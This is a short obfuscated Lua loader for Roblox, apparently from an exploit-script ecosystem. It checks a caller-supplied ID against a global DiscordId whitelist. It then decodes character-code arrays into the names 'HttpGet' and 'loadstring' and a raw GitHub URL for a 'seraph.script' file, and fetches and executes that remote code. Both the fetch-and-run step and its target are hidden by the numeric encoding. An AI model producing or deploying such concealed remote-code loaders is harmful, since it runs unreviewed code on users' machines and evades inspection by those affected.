return function(L_1_arg0)
	G_1_ = nil;
	L_1_arg1 = tostring;
    L_0_arg1 = print
	L_1_arg0 = L_1_arg1(L_1_arg0)
    L_0_arg1(L_1_arg0)
	if L_1_arg0 ~= G_1_ then
		if L_1_arg0 == _G.DiscordId then
			print(L_1_arg0)
			pcall(function()
				local function L_2_func(...)
					local L_6_ = {
						...
					}
					local L_7_ = ""
					for L_8_forvar0 = 1, #L_6_ do
						L_7_ = L_7_ .. string.char(L_6_[L_8_forvar0])
					end;
					return L_7_
				end;
				while not game[L_2_func(105, 115, 76, 111, 97, 100, 101, 100)] do
					game[L_2_func(76, 111, 97, 100, 101, 100)]:Wait()
				end;
				local L_3_ = L_2_func(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 76, 111, 115, 101, 110, 114, 121, 47, 115, 101, 114, 97, 112, 104, 46, 115, 99, 114, 105, 112, 116, 47, 109, 97, 105, 110, 47, 67, 108, 105, 101, 110, 116, 47, 76, 111, 99, 97, 108, 83, 99, 114, 105, 112, 116, 47, 73, 110, 105, 116, 47, 86, 105, 115, 117, 97, 108, 105, 122, 97, 116, 105, 111, 110, 47, 83, 101, 114, 101, 110, 105, 116, 121, 46, 115, 112, 104)
				local L_4_ = game[L_2_func(72, 116, 116, 112, 71, 101, 116)](game, L_3_)
				local L_5_ = loadstring(L_4_)
				if L_5_ then
					L_5_()
				end
			end)
		end
	end
end